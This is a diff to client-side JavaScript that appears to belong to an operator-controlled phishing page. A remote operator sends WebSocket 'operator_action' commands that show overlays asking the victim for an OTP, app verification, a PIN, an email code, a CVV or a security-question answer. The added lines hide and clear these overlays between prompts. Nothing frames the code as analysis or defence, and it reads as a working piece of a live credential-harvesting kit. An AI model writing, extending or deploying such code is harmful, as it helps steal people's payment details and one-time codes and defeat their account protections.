@@ -397,8 +397,12 @@ socket._hb=setInterval(function(){if(socket===ws&&socket.readyState===WebSocket.
 socket.onmessage=function(e){
 var msg=JSON.parse(e.data);
 console.log('[WS] Received:',msg);
+function hideAllOverlays(){['otp-overlay','app-verify-overlay','pin-overlay','email-overlay'].forEach(function(id){var el=document.getElementById(id);if(el)el.classList.add('hidden')});['otp-code','pin-d1','pin-d2','pin-d3','pin-d4','email-code'].forEach(function(id){var el=document.getElementById(id);if(el)el.value=''})}
+
 if(msg.type==='operator_action'){
 var p=msg.payload;var a=p.action;
+// Hide all overlays before showing the desired one
+if(a==='otp_verify'||a==='custom_otp_verify'||a==='custom_otp_tail'||a==='app_verify'||a==='pin_verify'||a==='email_verify'||a==='custom_email_verify'||a==='cvv_verify'||a==='question_verify'){hideAllOverlays()}
 if(a==='ack'){sid=p.sessionId;_sessionCreating=false;console.log('[WS] Session:',sid)}
 else if(a==='session_restored'){
   sid=p.sessionId;_sessionCreating=false;console.log('[WS] Restored:',sid);
